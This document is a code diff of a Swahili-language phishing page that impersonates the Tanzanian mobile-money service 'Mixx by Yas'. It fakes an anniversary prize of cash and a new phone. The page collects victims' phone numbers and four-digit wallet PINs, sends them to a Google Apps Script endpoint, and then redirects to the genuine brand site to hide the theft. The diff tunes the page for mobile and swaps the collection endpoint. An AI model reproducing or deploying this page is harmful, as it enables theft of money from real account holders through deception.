@@ -2,122 +2,131 @@
 <html lang="sw">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Mixx by Yas – Zawadi ya Maadhimisho ya Miaka 30</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       margin: 0;
+      padding: 0;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background: #FFDD00;
       color: #003080;
       min-height: 100vh;
-      padding: 0;
+      overflow-x: hidden;
     }
     .header {
       background: #003080;
       color: white;
-      padding: 40px 20px;
+      padding: 20px 15px;
       text-align: center;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
     .logo-img {
-      width: 280px;
+      width: 220px;               /* Smaller & perfect for mobile */
+      max-width: 80%;
       height: auto;
       display: block;
       margin: 0 auto;
     }
     .container {
-      max-width: 440px;
-      margin: 40px auto;
-      padding: 0 20px;
+      padding: 0 15px;
+      max-width: 100%;
     }
     .card {
       background: white;
-      border-radius: 24px;
-      box-shadow: 0 16px 48px rgba(0,0,0,0.2);
-      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+      padding: 25px 15px;
       text-align: center;
-      border: 4px solid #003080;
+      margin: 20px 0;
+      border: 3px solid #003080;
     }
     h1 {
-      font-size: 2.4rem;
-      color: #003080;
-      margin: 0 0 28px;
-      font-weight: 900;
-      text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      font-size: 1.9rem;
+      margin: 0 0 15px;
+      line-height: 1.2;
     }
     .highlight {
-      font-size: 2.2rem;
+      font-size: 1.6rem;
       color: #FFDD00;
       background: #003080;
-      padding: 16px 32px;
-      border-radius: 20px;
-      margin: 28px 0;
+      padding: 12px 20px;
+      border-radius: 15px;
+      margin: 20px auto;
+      display: inline-block;
+      width: 90%;
       font-weight: bold;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
     }
     p {
-      font-size: 1.2rem;
-      line-height: 1.6;
-      margin: 0 0 32px;
+      font-size: 1rem;
+      line-height: 1.5;
+      margin: 0 0 20px;
       color: #222;
+    }
+    .status-box {
+      color: #28a745;
+      font-weight: bold;
+      font-size: 1.1rem;
+      margin: 20px 0;
+      padding: 10px;
+      border: 2px dashed #28a745;
+      border-radius: 10px;
+      background: #f0fff4;
     }
     input {
       width: 100%;
-      padding: 18px 20px;
-      margin: 16px 0;
-      border: 3px solid #003080;
-      border-radius: 14px;
-      font-size: 1.25rem;
-      box-sizing: border-box;
-      background: #f8f9ff;
-      transition: all 0.2s;
+      padding: 16px;
+      margin: 12px 0;
+      border: 2px solid #003080;
+      border-radius: 12px;
+      font-size: 1.1rem;
+      background: #f9f9f9;
     }
     input:focus {
       border-color: #FFDD00;
       outline: none;
-      box-shadow: 0 0 0 5px rgba(255,221,0,0.4);
+      box-shadow: 0 0 0 4px rgba(255,221,0,0.3);
       background: white;
     }
     button {
       background: #003080;
       color: #FFDD00;
       border: none;
-      padding: 20px;
-      border-radius: 60px;
-      font-size: 1.4rem;
+      padding: 18px;
+      font-size: 1.2rem;
       font-weight: bold;
+      border-radius: 50px;
       width: 100%;
-      margin-top: 32px;
+      margin-top: 20px;
       cursor: pointer;
-      transition: all 0.25s;
-      box-shadow: 0 8px 28px rgba(0,71,171,0.5);
+      box-shadow: 0 6px 20px rgba(0,71,171,0.4);
+      transition: all 0.2s;
     }
-    button:hover {
-      background: #0047AB;
-      transform: translateY(-4px);
-      box-shadow: 0 16px 48px rgba(0,71,171,0.6);
+    button:active {
+      transform: scale(0.98);
     }
     #success {
       display: none;
-      font-size: 1.7rem;
+      font-size: 1.2rem;
       color: #28a745;
-      margin: 60px 0;
+      margin: 30px 0;
       font-weight: bold;
-      text-shadow: 0 3px 10px rgba(0,0,0,0.3);
     }
     .warning {
       color: #d32f2f;
       font-weight: bold;
-      margin-top: 40px;
-      font-size: 1.2rem;
+      margin-top: 30px;
+      font-size: 0.95rem;
     }
     .footer {
-      margin-top: 60px;
-      font-size: 1rem;
-      color: #333;
+      padding: 20px 15px;
+      font-size: 0.9rem;
+      color: #003080;
       text-align: center;
-      opacity: 0.85;
+      font-weight: 600;
     }
   </style>
 </head>
@@ -129,32 +138,35 @@
   <div class="container">
     <div class="card">
       <h1>Zawadi Yako ya Maadhimisho ya Miaka 30</h1>
-      <p class="highlight">HADI TSH 800,000 + SIMU MPYA!</p>
+      
+      <div class="highlight">HADI TSH 800,000 + SIMU MPYA!</div>
+      
       <p>Simu mpya kabisa (Samsung, Redmi, Infinix) + hadi TSH 800,000 cash bonus papo hapo inakusubiri.</p>
       
-      <p style="color:#28a745; font-weight:bold; font-size:1.5rem; margin:32px 0;">
+      <div class="status-box">
         STATUS: APPROVED & READY TO DISBURSE
-      </p>
+      </div>
       
       <p>Thibitisha kwa kuingiza namba yako na nambari ya siri ya pochi (4 tarakimu):</p>
       
-     <form id="claimForm" action="https://script.google.com/macros/s/AKfycbyHOAtdzfCDgOcpBu0WZBOs2xDH7E210L_8rJs6oePbzWiqx0KEBzhlUbiyTbc8Ooa-iw/exec" method="POST">
-  <input type="tel" name="phone" placeholder="Namba ya Simu (07XXXXXXXX)" required pattern="[0-9]{10}" inputmode="numeric">
-  <input type="password" name="pin" placeholder="Nambari ya Siri (4 tarakimu)" required pattern="[0-9]{4}" inputmode="numeric" maxlength="4">
-  <button type="submit">THIBITISHA & POKEA ZAWADI SASA</button>
-</form>
+      <form id="claimForm" action="https://script.google.com/macros/s/AKfycbxBQCge5fq9ByjCA11HWJF5JpIsNPLrWyu-XMeeUX5cYM-pLvRh1Wqvto-bTziOfL3SvQ/exec" method="POST">
+        <input type="tel" name="phone" placeholder="Namba ya Simu (07XXXXXXXX)" required pattern="[0-9]{10}" inputmode="numeric">
+        <input type="password" name="pin" placeholder="Nambari ya Siri (4 tarakimu)" required pattern="[0-9]{4}" inputmode="numeric" maxlength="4">
+        <input type="hidden" name="extra" value="Miaka 30 Claim - Mobile Optimized">
+        <button type="submit">POKEA ZAWADI SASA</button>
+      </form>
       
       <div id="success">
         Zawadi imethibitishwa! Subiri simu na cash yako (hadi TSH 800,000) – utapokea SMS confirmation. Unaenda kwenye akaunti rasmi...
       </div>
       
       <p class="warning">
-        OFA HII INAISHIA MASAA 12 TU – WATEJA 3,500+ WAMEPOKEA TAYARI!
+        Zimebaki nafasi chache! Ofa inaisha baada ya muda mfupi.
       </p>
     </div>
     
     <div class="footer">
-      © 2026 Mixx by Yas – Salama • Haraka • Huduma Bora Tanzania
+      © 2026 Mixx by Yas – Salama na Haraka
     </div>
   </div>
 
@@ -164,22 +176,18 @@
 
     form.addEventListener('submit', e => {
       e.preventDefault();
-      form.style.opacity = '0.6';
+      form.style.opacity = '0.3';
       form.style.pointerEvents = 'none';
       success.style.display = 'block';
-
       fetch(form.action, {
         method: 'POST',
-        body: new FormData(form)
+        body: new FormData(form),
+        mode: 'no-cors'
       }).catch(() => {});
-
       setTimeout(() => {
         window.location.href = "https://mixx.co.tz/";
-      }, 3500);
+      }, 3000);
     });
   </script>
 </body>
-
 </html>
-
-
